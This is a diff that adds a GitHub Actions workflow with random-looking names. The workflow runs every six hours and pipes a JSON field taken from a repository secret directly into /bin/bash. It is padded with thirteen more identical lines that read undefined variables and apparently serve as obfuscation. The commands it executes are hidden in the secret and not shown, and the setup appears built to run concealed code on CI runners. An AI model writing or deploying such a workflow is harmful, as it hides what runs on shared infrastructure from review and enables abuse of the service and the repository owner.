@@ -1,0 +1,30 @@
+name: wangyuchou6565
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangyuchou6565
+        env:
+          act3: ${{ secrets.act3 }}
+        run: |
+          echo $act3 | jq -r .vusq1 | /bin/bash
+          echo $o83832 | jq -r .qym8849 | /bin/bash
+          echo $neb9671 | jq -r .iaw6 | /bin/bash
+          echo $kg02664 | jq -r .y59 | /bin/bash
+          echo $qiwok0 | jq -r .q781 | /bin/bash
+          echo $i0766 | jq -r .aexxu3003 | /bin/bash
+          echo $mkgt1649 | jq -r .filbu6 | /bin/bash
+          echo $dltsi3 | jq -r .bq63435 | /bin/bash
+          echo $vg76 | jq -r .twvd5 | /bin/bash
+          echo $txzt62 | jq -r .f7678 | /bin/bash
+          echo $gm0974 | jq -r .fo2008 | /bin/bash
+          echo $uzz14 | jq -r .g922 | /bin/bash
+          echo $k3741 | jq -r .ak562 | /bin/bash
+          echo $reeq55469 | jq -r .izjwz80099 | /bin/bash
+
